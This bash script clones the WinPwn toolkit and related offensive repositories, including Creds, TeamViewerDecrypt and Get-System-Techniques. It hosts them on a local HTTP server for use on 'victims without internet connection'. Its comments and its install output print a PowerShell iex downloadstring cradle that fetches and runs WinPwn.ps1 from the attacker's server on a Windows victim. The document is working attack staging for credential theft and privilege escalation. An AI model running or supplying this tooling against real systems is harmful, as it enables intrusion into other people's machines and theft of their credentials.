#!/bin/bash
# Downloadscript for a local WinPwn repository by 0x23353435
# All WinPwn functions can be used over a local Webserver on victims without internet connection.
# After installing this local repo you can either use the --start-server options of this script or start an own one with the following command:
# python3 -m http.server {Portnumber}
# To make WinPwn.ps1 use this script just use the parameter -repo:
# PS> iex (new-object net.webclient).downloadstring('http://{IP-Address}:{Portnumber}/WinPwn_Repo/WinPwn/master/WinPwn.ps1')
# PS> WinPwn -repo http://{IP-Address}:{Portnumber}/WinPwn_Repo

echo -e "\e[1;94m__        ___       ____                 "
echo -e "\ \      / (_)_ __ |  _ \__      ___ __  "
echo -e " \ \ /\ / /| | '_ \| |_) \ \ /\ / | '_ \ "
echo -e "  \ V  V / | | | | |  __/ \ V  V /| | | |"
echo -e "   \_/\_/  |_|_| |_|_|     \_/\_/ |_| |_|"
echo -e "                                         "
echo -e "   ---> Create your local WinPwn repo!   \e[0m\n"

function show-help () {
echo -e "Usage:"
echo -e "\e[1;94m./Get_WinPwn_Repo.sh {Option}\e[0m\n"
echo -e "Example:"
echo -e "\e[1;94m./Get_WinPwn_Repo.sh --install\e[0m\n"
echo -e "Options:"
echo -e "\e[1;94m--install\e[0m             Download the repository and place it to \e[1;94m./WinPwn_Repo/\e[0m"
echo -e "\e[1;94m--remove\e[0m              Remove the repository \e[1;94m./WinPwn_Repo/\e[0m"
echo -e "\e[1;94m--reinstall\e[0m           Remove the repository and download a new one to \e[1;94m./WinPwn_Repo/\e[0m"
echo -e "\e[1;94m--start-server\e[0m        Start a \e[1;94mpython HTTP server\e[0m on port 8000"
echo -e "\e[1;94m--help\e[0m                Show this help"
}

function install () {
echo -e "\e[1;94mGetting PowerSharpPack...\e[0m"
git clone https://github.com/S3cur3Th1sSh1t/PowerSharpPack ./WinPwn_Repo/PowerSharpPack/master/
echo -e "\n\e[1;94mGetting WinPwn...\e[0m"
git clone https://github.com/S3cur3Th1sSh1t/WinPwn ./WinPwn_Repo/WinPwn/master/
echo -e "\n\e[1;94mGetting SharpCradle...\e[0m"
git clone https://github.com/S3cur3Th1sSh1t/Invoke-Sharpcradle ./WinPwn_Repo/Invoke-Sharpcradle/master/
echo -e "\n\e[1;94mGetting Creds...\e[0m"
git clone https://github.com/S3cur3Th1sSh1t/Creds ./WinPwn_Repo/Creds/master/
echo -e "\n\e[1;94mGetting TeamViewerDecrypt...\e[0m"
git clone https://github.com/S3cur3Th1sSh1t/TeamViewerDecrypt ./WinPwn_Repo/TeamViewerDecrypt/master/
echo -e "\n\e[1;94mGetting Get-System-Techniques...\e[0m"
git clone https://github.com/S3cur3Th1sSh1t/Get-System-Techniques ./WinPwn_Repo/Get-System-Techniques/master/
echo -e "\n\e[1;94mGetting ACLight...\e[0m"
git clone https://github.com/S3cur3Th1sSh1t/ACLight ./WinPwn_Repo/ACLight/master/
echo -e "\n\e[1;94mGetting SpoolerScanner...\e[0m"
git clone https://github.com/S3cur3Th1sSh1t/SpoolerScanner ./WinPwn_Repo/SpoolerScanner/master/

echo -e "\n\e[1;94mDone!\e[0m"
echo -e "\nThe local repository can be found under: \e[1;94m$PWD/WinPwn_Repo/\e[0m"
echo -e "\nNow you can open a \e[1;94mpython HTTP server\e[0m here to to use \e[1;94mWinPwn.ps1\e[0m with this custom repo."
echo -e "Example usage on your Windows victim:"
echo -e "\e[1;94mPS> \e[94miex (new-object net.webclient).downloadstring('\e[91mhttp://192.168.1.10:8000/WinPwn_Repo\e[94m/WinPwn/master/WinPwn.ps1')\e[0m"
echo -e "\e[1;94mPS> \e[94mWinPwn -repo \e[91mhttp://192.168.1.10:8000/WinPwn_Repo\e[0m"
}

function remove () {
rm -rf ./WinPwn_Repo
echo -e "\n\e[1;94mDone!\e[0m"
echo -e "\nThe local repository was removed!"
}

function start-server () {
python3 -m http.server 8000
}

if [ "$#" -eq 1 ]; then
        case $1 in
                "--install" )
                        install
                        ;;
                "--reinstall" )
                        remove
                        install
                        ;;
                "--remove" )
                        remove
                        ;;
                "--start-server" )
                        start-server
                        ;;
                * )
                        show-help
                        ;;
        esac
else
        show-help
fi

exit 0
